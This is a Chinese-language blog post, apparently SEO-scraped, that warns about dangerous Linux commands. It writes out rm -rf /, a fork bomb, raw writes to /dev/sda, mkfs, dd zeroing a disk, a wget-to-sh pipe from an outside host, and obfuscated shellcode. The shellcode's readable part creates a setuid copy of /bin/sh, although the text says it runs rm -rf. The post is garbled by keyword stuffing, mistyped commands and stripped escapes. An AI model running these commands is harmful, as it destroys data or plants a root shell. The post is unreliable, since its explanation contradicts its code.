---



title: "rm-rf命令该命令可能导致不可恢复的系统崩坏"
description: "rm-rf命令该命令可能导致不可恢复的系统崩坏"
keywords: "rm-rf命令该命令可能导致不可恢复的系统崩坏"
date: "2023-06-18T16:22:52+08:00"
defaultContentLanguage: "zh"
author: "Linux"
twitterSite: ""
thumbnail: "https://www.linuxcool.com/wp-content/uploads/2023/01/1674482426427_1.png"
categories:
  - Linux
type: article
githubURL: "https://www.github.com/"
ShowToc: true
TocOpen: true



---

rm -rf 命令

该命令可能导致不可恢复的系统崩坏。

```
> rm -rf /  #强制删除根目录下所有东西。
> rm -rf *  #强制删除当前目录的所有文件。
> rm -rf .  #强制删除当前文件夹及其子文件夹。
```

执行rm -rf 一定要想半天,搞明白自己在干什么。

fork 炸弹

```
:) { :|:& };:
```

不太好理解可以转换成：

```
bomb()
{
    bomb|bomb&
};
bomb
```

一旦执行起来,-bash: fork: Cannot allocate memory **删除命令linux**，会把系统资源消耗殆尽。它会调用自己两次，一次在前台另一次运行在后台。它会反复地执行下去直到系统崩溃。

echo “” > /dev/sda

该操作会将在块设备中的所有数据块替换为命令写入的原始数据linux运维博客，从而导致整个块设备的数据丢失。

mv 文件夹 /dev/null

```
> mv /etc /dev/null
```

/dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。但是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。

下载的文件立即执行

```
> wget http://rumenz.com/rumenz.sh -O- | sh
```

如果rumenz.sh是一个病毒脚本,就完蛋了。下载脚本文件之前要看看里面的内容,有危险的操作就不要执行。

mkfs.ext3 /dev/sdb

这个命令会格式化块设备sdb，在执行这个命令后你的块设备(硬盘驱动器)会被格式化 **删除命令linux**，直接让你的系统达到不可恢复的阶段。

重定向输出到文件

```
>  > rumenz.txt
```

这个命令常用来清空文件内容或记录命令输出,执行之前请考虑清楚。

^foo^bar

这个命令用来编辑先前运行的命令而无需重打整个命令。

![linux删除文件夹命令_linux 删除文件夹 命令_删除命令linux](https://www.linuxcool.com/wp-content/uploads/2023/01/1674482426427_1.png)

用foobar命令时如果你没有彻底检查改变原始命令的风险linux软件，这可能导致真正的麻烦。

硬盘清零

```
> dd if=/dev/zero of=/dev/had
```

这个命令会将整个主硬盘清零。

执行伪装后的命令

```
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */

= “xebx3ex5bx31xc0x50x54x5ax83xecx64x68″
“xffxffxffxffx68xdfxd0xdfxd9x68x8dx99″
“xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7″
“x56x04xf7x56x08xf7x56x0cx83xc4x74x56″
“x8dx73x08x56x53x54x59xb0x0bxcdx80x31″
“xc0x40xebxf9xe8xbdxffxffxffx2fx62x69″
“x6ex2fx73x68x00x2dx63x00″
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

上面的命令就是rm -rf ，这里的代码是隐藏在十六进制里的，可能会擦除你的根分区，所以看不懂的命令千万不能执行,非要看效果,请在虚拟机中执行。